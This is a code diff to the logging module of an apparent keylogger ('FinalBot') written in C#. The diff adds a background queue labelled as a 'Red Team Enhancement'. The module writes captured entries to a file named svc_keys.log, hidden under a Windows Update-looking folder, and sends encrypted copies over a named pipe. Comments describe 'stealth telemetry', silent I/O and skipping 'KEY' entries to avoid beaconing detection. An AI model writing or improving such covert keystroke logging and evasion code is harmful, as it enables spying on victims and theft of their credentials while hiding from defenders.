@@ -1,35 +1,75 @@
 using System;
+using System.Collections.Concurrent;
 using System.IO;
 using System.Text;
 using System.IO.Pipes;
+using System.Threading;
+using System.Threading.Tasks;
 
 namespace FinalBot
 {
     public static class Logger
     {
         private static readonly string LogFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Windows", "Update", "svc_keys.log");
-        private static readonly object _lock = new object();
         private static readonly string Salt = "n2xkNQYbZwj8r9fz";
+        
+        // Red Team Enhancement: Async Processing Queue
+        private static readonly BlockingCollection<LogEntry> _logQueue = new BlockingCollection<LogEntry>(new ConcurrentQueue<LogEntry>());
+        private static readonly CancellationTokenSource _cts = new CancellationTokenSource();
+
+        struct LogEntry {
+            public string Message;
+            public string Level;
+            public string Timestamp;
+        }
+
+        static Logger()
+        {
+            // Start background worker for silent I/O
+            Task.Run(() => ProcessLogQueue(_cts.Token), _cts.Token);
+        }
 
         public static void Log(string message, string level = "INFO")
         {
             try
             {
-                lock (_lock)
-                {
-                    string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
-                    string logEntry = $"[{timestamp}] [{level}] {message}";
-                    
-                    ConfigureConsoleColor(level);
-                    Console.WriteLine(logEntry);
-                    Console.ResetColor();
-
-                    try { File.AppendAllText(LogFile, logEntry + Environment.NewLine); } catch { }
-
-                    SendToPipe(logEntry);
-                }
+                // Instant hand-off, no blocking
+                _logQueue.Add(new LogEntry {
+                    Message = message,
+                    Level = level,
+                    Timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss")
+                });
+                
+                // Immediate local debug visibility (Non-blocking)
+                ConfigureConsoleColor(level);
+                Console.WriteLine($"[{level}] {message}");
+                Console.ResetColor();
             }
             catch { }
+        }
+
+        private static void ProcessLogQueue(CancellationToken ct)
+        {
+            while (!ct.IsCancellationRequested)
+            {
+                try
+                {
+                    LogEntry entry = _logQueue.Take(ct);
+                    string logEntry = $"[{entry.Timestamp}] [{entry.Level}] {entry.Message}";
+                    
+                    // 1. Silent File I/O
+                    try { File.AppendAllText(LogFile, logEntry + Environment.NewLine); } catch { }
+
+                    // 2. Encrypted Pipe Transmission (Stealth Telemetry)
+                    // RED TEAM: Skip KEY level to avoid traffic pattern detection (Beaconing)
+                    if (entry.Level != "KEY")
+                    {
+                        SendToPipe(logEntry);
+                    }
+                }
+                catch (OperationCanceledException) { break; }
+                catch { Thread.Sleep(100); }
+            }
         }
 
         private static void SendToPipe(string message)
@@ -47,9 +87,11 @@ namespace FinalBot
 
                 string base64 = Convert.ToBase64String(encrypted);
 
+                // Use a short timeout to prevent hanging, but since it's background thread, 
+                // even 500ms won't affect typing lag.
                 using (var pipeClient = new NamedPipeClientStream(".", "vanguard_status_pipe", PipeDirection.Out))
                 {
-                    pipeClient.Connect(200);
+                    pipeClient.Connect(500);
                     using (var writer = new StreamWriter(pipeClient))
                     {
                         writer.Write(base64);
@@ -66,15 +108,8 @@ namespace FinalBot
             Log(fullMessage, "ERROR");
         }
 
-        public static void Warn(string message)
-        {
-            Log(message, "WARN");
-        }
-
-        public static void Info(string message)
-        {
-            Log(message, "INFO");
-        }
+        public static void Warn(string message) { Log(message, "WARN"); }
+        public static void Info(string message) { Log(message, "INFO"); }
 
         private static void ConfigureConsoleColor(string level)
         {
